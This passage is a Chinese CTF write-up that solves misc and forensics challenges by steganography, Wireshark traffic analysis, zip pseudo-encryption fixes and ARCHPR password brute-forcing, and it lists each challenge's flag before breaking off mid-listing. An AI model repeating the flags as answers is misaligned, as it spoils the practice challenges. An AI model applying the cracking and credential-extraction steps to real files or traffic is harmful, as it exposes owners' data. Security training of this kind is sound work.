class="line">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</span><br></pre></td></tr></table></figure><h3 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h3><p>下载代码下来审计，发现如下一行。<code>$pass = &#39;6ac45fb83b3bc355c024f5034b947dd3&#39;; //angel</code> 直接取出字符串得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</span><br></pre></td></tr></table></figure><h3 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h3><p>.bin 文件，猜测是路由器配置文件。使用 RouterPassView 查看，尝试之后发现用户名字段为 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885025608.e64adb11a27ac3c13fd3154adb4a5a8264abc4c1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;053700357621&#125;</span><br></pre></td></tr></table></figure><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>打开音频文件，发现中间夹杂着莫斯电码，使用 CwGet 接收，得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885182886.14155fa0c7506586593a582774124c06e8b0ba13.png"></p><p>图上第一个字符有误，音频中为 <code>.....</code> 应为 <code>5</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5BC925649CB0188F52E617D70929191C&#125;</span><br></pre></td></tr></table></figure><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>Wireshark 分析数据包，追踪 TCP 流，可以发现 base64 数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885296634.698d13942fd0608d192438996a7b9e30d9c02127.png"></p><p>将其前后冗余数据去除后加上 <code>data:image/jpeg;base64,</code> 可以解码成图片，从而得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885470839.b6f44fde5d1030d302e445779e2e03435759b546.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>010 editor 打开文件，发现其尾部有压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885549935.0f0d129a115414c7dabf5029c2aa6671517f9705.png"></p><p><code>binwalk -e</code> 分离出来，得到套娃的两个压缩文件。第二层的图片被加密了，找不到其他信息，猜测是伪加密。修改 <code>14 00 01 08</code> 为 <code>14 00 00 08</code> 成功解压出图片。</p><p>然后 jpg 图片看隐写，StegHide 成功解出 secret，得到第三层压缩包密码 <code>bV1g6t5wZDJif^J7</code>。</p><p>解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</span><br></pre></td></tr></table></figure><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>010 editor 打开文件，发现其尾部有压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885666559.b0d6e19e7d50289e7176ddfd1fb914e1461cd13c.png"></p><p><code>binwalk -e</code> 分离出来，得到一个加密的压缩文档。分析之后可知是伪加密，修正之后解压得到虚拟磁盘文件。使用 <code>7z x flag.vmdk</code> 解压并重命名 <code>NUL</code> 文件之后可以得到两端文本。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----</span><br><span class="line">&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++</span><br><span class="line">++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure><p>分别将其使用 Brainfuck 和 Ook! 解码之后可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;N7F5_AD5_i5_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h3><p>跟之前的后门查杀一样，找到 <code>$pass = &#39;ba8e6c6f35a53933b871480bb9a9545c&#39;; //angel</code> 即得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</span><br></pre></td></tr></table></figure><h3 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h3><p>使用 Wireshark 分析流量包，筛选 http 条目，找到唯一的 POST 请求，即可得到账号密码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885841292.80cf7ab7079293a2845d161ab3307f5b3cc868c3.png"></p><p>根据提示将帐号密码串起来再 MD5 一次即得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</span><br></pre></td></tr></table></figure><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>解压得到一张图片，根据暗示尝试 F5 隐写。<code>java Extract .\Misc.jpg</code> 解得一个压缩文档。分析后为伪加密，将 <code>deFlag</code> 处改为 <code>00 00</code> 即可解压出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;96efd0a2037d06f34199e921079778ee&#125;</span><br></pre></td></tr></table></figure><h3 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h3><p>010 editor 打开文件，发现其尾部有压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885940662.e8c5f8bcb0e66cc06a256cbf1afcd7426317043e.png"></p><p><code>binwalk -e</code> 分离出来，解压得到两个文件。将 key 文件中的 base64 解码得到如下文本。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is Nicki Minaj&#39;s favorite song that refers to snakes?</span><br></pre></td></tr></table></figure><p>搜索之后可得 key 为 <code>anaconda</code>。根据题目暗示可知加密方式是 Serpent，使用对应解密工具解密可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;who_knew_serpent_cipher_existed&#125;</span><br></pre></td></tr></table></figure><h3 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h3><p>010 editor 打开文件，发现其尾部有数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885940662.e8c5f8bcb0e66cc06a256cbf1afcd7426317043e.png"></p><p>复制出来之后用十六进制转 ASCII 可以得到一些坐标点，将其处理成 csv 格式的数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886168220.f4f05764291e92930acf02767a8b1ce6680d4c18.png"></p><p>使用 Excel 画出散点图，可以得出一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886342936.c2a37e4b2a9f7810d2bababdcae1d08a5f0284c2.png"></p><p>扫描即可得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</span><br></pre></td></tr></table></figure><h3 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h3><p>使用 Wireshark 分析流量包，追踪 TCP 流可知道 flag 在一个压缩包内。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886504913.53d195ec1f83ca7885a647377a72ae4552376f3b.png"></p><p><code>binwalk -e</code> 分离出来，发现需要密码。回到 TCP 流的跟踪中可以发现一张图片的传输，将其提取出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886730345.7fe607292709030eeb34ceff8017a544dc4a799b.png"></p><p>得到压缩包的密码，解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure><h3 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h3><p>Wireshark 分析流量包，跟踪 TCP 流，可以发现一个压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886850073.f57e98db89b45351f410faa09cbc691a5c39d229.png"></p><p>将其保存下来然后使用 ARCHPR 爆破得出解压密码为 5790。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886929674.1e7e180ae53beaf41947f5fe56abe0bfcbd2dd7c.png"></p><p>解压文件即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h3><p>解压后得到 xls 文件，010 editor 打开可见如下提示。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886994336.a50c2318bd6aa0ad8f5040b5b64c7a9707532e2b.png"></p><p>将后缀名改为  zip 打开后找到 <code>../charts/flag.txt</code>，打开即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;M9eVfi2Pcs#&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h3><p>foremost 从图片中分离出一个压缩文档，打开后可以得到一个 Word 文档，打开后可得一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887081820.0c3f0446382396b482aaebea8699e03e822b110a.png"></p><p>扫描二维码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_are_the_best!&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h3><p>附加压缩文档存在伪加密，修正之后解压可得一个文本文档。在其中有如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸</span><br></pre></td></tr></table></figure><p>使用与佛论禅程序解密可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w0_fo_ci_Be1&#125;</span><br></pre></td></tr></table></figure><h3 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h3><p>与被偷走的文件一致，Wireshark 分析流量包跟踪 TCP 流，可以发现一个压缩文档。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887199430.43fa75243a53d80de63e06268600b59c62afb9ea.png"></p><p>将其保存下来然后使用 ARCHPR 爆破得出解压密码为 1903。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887291132.1d9bb41a06ba87a7616a78f927d08828210d2e6e.png"></p><p>解压文件即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h3><p>010 editor 打开文件，在文件尾部可发现 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;i_am_fl@g&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h3><p>binwalk 可以发现解压出来的图片中存在四个压缩文档，<code>binwalk -e</code> 分离出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887391117.52f5442a41a02922905703ad2c8fe38f71d6c702.png"></p><p>除开找到的彩蛋，有用的信息在一个 Word 文档中，套娃 base64 解码之后得到 <code>comEON_YOuAreSOSoS0great</code>。将这串字符串作为压缩包密码解压出音频。很容易分辨出音频是摩斯电码，使用 CwGet 接收可得文本。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887480959.711d4e5a9f83f8f8b4640204290e7d72d169f61f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;morseisveryveryeasy&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h3><p>PNG 文件 CRC32 校验失败，加之 StegSolve 无解，于是猜测图片宽高不对。使用脚本计算出宽高 <code>(&#39;hex:&#39;, &#39;0x141&#39;, &#39;0x34c&#39;)</code> 并修正。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887740791.99b61980fdd9a73437e2fa25fa9c99d38cb3adbc.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xaflag&#123;66666&#125;</span><br></pre></td></tr></table></figure><h3 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h3><p>将音频文件导入 Audition，可发现右声道存在摩斯电码，使用 CwGet 接收可得文本。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887938632.d5c8a5760ebe3383608743fa31e91ba7f2e40465.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888054470.195b3899708f33a375f08b788026f762d6d8da71.png"></p><p>去除掉重复部分并拼接可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h3><p>解压得到两个 gif 文件，其中有一个无法打开。使用 010 editor 打开，看到开头为 9a 两个字符，猜测是 GIF 头不完整，补全为 GIF89a 后可以成功打开并看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888294288.80c5911e71b58e7c06b0eb32231348ab3b3e09a8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zhi_yin_you_are_beautiful&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h3><p>解压之后得到一个压缩文档，根据压缩文档名称提示，使用 ARCHPR 爆破得到密码 2016。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888395076.34712e52aa5a1240122f7e3ab0a8c49f9e4e07f4.png"></p><p>解压得到一张 jpg 图片，使用 010 editor 打开可在文件中部找到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888517475.119ec1d97bde7645ee8188af2a80e83783de509c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Wadf_123&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h3><p>下载个 VisualBoyAdvance-M 并载入游戏，根据剧情和提示走到 103 号路就能看到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888730452.7a977dbfa27c3572c3700ef4879f4edcc0526ddf.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;PokEmon_14_CutE&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-outguess"><a href="#ACTF新生赛2020-outguess" class="headerlink" title="[ACTF新生赛2020]outguess"></a>[ACTF新生赛2020]outguess</h3><p>解压出来非常多奇怪文件，不过根据题目名称，应该是 outguess 隐写，所以要找一下 key。在图片的属性中找到一串社会主义核心价值观，解密一下可以得到 abc，因此 abc 是 key。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888820241.e467a85034de66620e8eeec563a082db308d875a.png"></p><p>将 abc 作为密钥对图片执行 outguess 解密操作即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213888963913.5274813fcba7290b3cb8454dcf422522407c1122.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-纳尼"><a href="#BJDCTF2020-纳尼" class="headerlink" title="[BJDCTF2020]纳尼"></a>[BJDCTF2020]纳尼</h3><p>010 editor 打开解压出来的 GIF 图片，根据文本文档提示可知需要补全 GIF 文件头，于是插入 GIF8 补全文件头。用 PS 打开逐帧导出可以得到一串字符串。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889058234.19200e91f4cfb0fe51b48e0fb101b2e2bd220ecd.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889155913.ea27774e53f86a7ef013d59e7b21f45de589fd35.png"><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889248644.1c97de3e883f24ee492dba1bcaf03de12f41613d.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889332362.f6334fc5cbb7484451a019aa57ebb4658565dc45.png"></p><p>得到字符串为 <code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code>，base64 解码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;wang_bao_qiang_is_sad&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-我有一只马里奥"><a href="#SWPU2019-我有一只马里奥" class="headerlink" title="[SWPU2019]我有一只马里奥"></a>[SWPU2019]我有一只马里奥</h3><p>运行一次可执行文件，可以得到提示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><p>于是尝试使用 NTFS Stream Editor 分析，可以发现输出的文本文档中包含附加数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889486230.0d5784774e82f538a32d01e90679cc4550e443ee.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swupctf&#123;ddg_is_cute&#125;</span><br></pre></td></tr></table></figure><h3 id="谁赢了比赛？"><a href="#谁赢了比赛？" class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h3><p>010 editor 打开文件，发现其尾部有压缩文档。<code>binwalk -e</code> 分离出来，使用 ARCHPR 爆破得到密码 1020。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889579589.5ef9476a708b04a5236c36de9805d37c21ad735e.png"></p><p>得到一张 GIF 图片，使用 PS 打开，在图层 310 处可以看见 hint <code>do_you_know_where_is_flag</code>。将图层导出，使用 StegSolve 解隐写，可以得到一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213889684480.56b82919bec2b70973938d831ca4e95777a01827.png"></p><p>扫描即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;shanxiajingwu_won_the_game&#125;</span><br></pre></td></tr></table></figure><h3 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h3><p>用 IDA 打开分析程序，根据字符串 well done 可以找到子程序 sub_401090。将其反编译得到以下代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 